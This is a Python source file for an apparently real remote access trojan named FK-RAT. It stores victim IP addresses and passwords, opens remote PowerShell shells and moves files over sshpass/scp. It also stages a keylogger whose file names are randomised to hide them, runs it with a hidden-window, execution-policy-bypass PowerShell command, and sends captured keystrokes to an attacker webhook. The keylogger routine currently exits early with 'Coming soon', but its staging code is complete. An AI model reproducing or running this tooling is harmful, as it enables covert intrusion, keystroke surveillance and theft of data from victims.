import getpass
import os
import random as ran
import time

from django.core.validators import URLValidator

username = getpass.getuser()
header = f"{username}@FK-RAT"
github_path = "https://raw.githubusercontent.com/Sunnickel/FK-RAT/main/"
local_path = f"/home/{username}/.FK-RAT" if username != "root" else "/root/.FK-RAT"


def randomText():
    LowerCharacters = "abcdefghijklmnopqrstuvwxyz"
    UpperCharacters = "abcdefghijklmnopqrstuvwxyz".upper()
    chars = LowerCharacters + UpperCharacters
    randomText = " ".join((ran.choice(chars) for i in range(8)))
    randomTest = ""
    for char in randomText:
        randomTest += char
    return randomTest.replace(" ", "")


def editFile(path, line, input):
    f = open(f"{path}", 'r')
    lines = f.readlines()
    lines[line - 1] = input
    f.close()

    f = open(f"{path}", 'w')
    f.writelines(lines)
    f.close()


# read config file
def read_config(config_file):
    configuration = {}

    time.sleep(2)

    # get file content
    read_lines = open(f"{local_path}/targets/" + config_file, "r").readlines()

    # get target information
    configuration["IPADDRESS"] = read_lines[0].strip()
    configuration["PASSWORD"] = read_lines[1].strip()
    configuration["USERNAME"] = read_lines[2].strip()
    try:
        configuration["KEYLOGGER"] = read_lines[3].strip()
    except IndexError:
        configuration["KEYLOGGER"] = "Not set"
    configuration["TEMPDIR"] = read_lines[4].strip()

    # return config
    return configuration


# Upload File to target with path   (SCP)
def remote_upload(upload_file, config, path):
    password = config.get("PASSWORD")
    ip = config.get("IPADDRESS")
    os.system(f"sshpass -p \"{password}\" scp -o StrictHostKeyChecking=accept-new {upload_file} fkrat@{ip}:{path}")


# Download File to target with path   (SCP)
def remote_download(config, path):
    password = config.get("PASSWORD")
    ip = config.get("IPADDRESS")

    if not os.path.exists(f"{local_path}/Downloads"):
        os.mkdir(f"{local_path}/Downloads")

    os.system(
        f"sshpass -p \"{password}\" scp -r -o StrictHostKeyChecking=accept-new fkrat@{ip}:{path} {local_path}/Downloads")


# Connects RAT to target        Payload 0
def remoteConsole(file):
    config = read_config(file)
    ipv4 = config.get("IPADDRESS")
    target_password = config.get("PASSWORD")
    username = config.get("USERNAME")

    # remote connect
    os.system("clear")
    print(f"[..] Connecting to {file}")
    os.system(f"sshpass -p \"{target_password}\" ssh fkrat@{ipv4} -o StrictHostKeyChecking=accept-new 'powershell'")


# Keylogger which sends to Webhook or downloads to console device
def keylogger(file):
    print("Coming soon... ")
    exit()
    config = read_config(file)
    username = config.get("USERNAME")
    password = config.get("PASSWORD")
    ip = config.get("IPADDRESS")
    tempdir = config.get('TEMPDIR')
    # Setup Keylogger for Target
    if config.get("KEYLOGGER") == "Not set":
        webhook = input("Copy the link of your Webhook here : ")

        try:
            URLValidator()(f"{webhook}")
        except:
            print("[!!] Please enter a existing webhook")
        with open(f"{local_path}/targets/{file}", "r") as f:
            contents = f.readlines()
        contents.insert(3, f"{webhook}")
        with open(f"{local_path}/targets/{file}", "w") as f:
            contents = " ".join(contents)
            f.write(contents)
    webhook = config.get("KEYLOGGER")
    ## Upload Keylogger
    # file paths
    keylogger = f"{local_path}/payloads/Keylogger/keylogger.py"
    keylogger_task = f"{local_path}/payloads/Keylogger/keylogger-task.ps1"
    path = f"C:/Users/{username}/Appdata/Local/Temp/{tempdir}"

    # obfuscate files
    obfuscate_keylogger = randomText() + ".py"
    obfuscate_keylogger_task = randomText() + ".ps1"

    # file staging
    os.system(f"cp {keylogger} {local_path}/{obfuscate_keylogger}")
    os.system(f"cp {keylogger_task} {local_path}/{obfuscate_keylogger_task}")


    editFile(f"{local_path}/{obfuscate_keylogger}", 12, f"        self.webhook = \"{webhook.split(' ')[0]}\"")

    #TODO add a new Keylogger which sends to Webhook

    remote_upload(f"{local_path}/{obfuscate_keylogger}", config, path)  # Keylogger
    remote_upload(f"{local_path}/{obfuscate_keylogger_task}", config, path)

    os.system(f"rm {local_path}/{obfuscate_keylogger}")
    os.system(f"rm {local_path}/{obfuscate_keylogger_task}")

    os.system(f"sshpass -p \"{password}\" ssh fkrat@{ip} 'powershell.exe -windowstyle hidden -ep bypass -File \"C:/Users/{username}/AppData/Local/Temp/{tempdir}/{obfuscate_keylogger_task}\" -ArgumentList {tempdir}'")
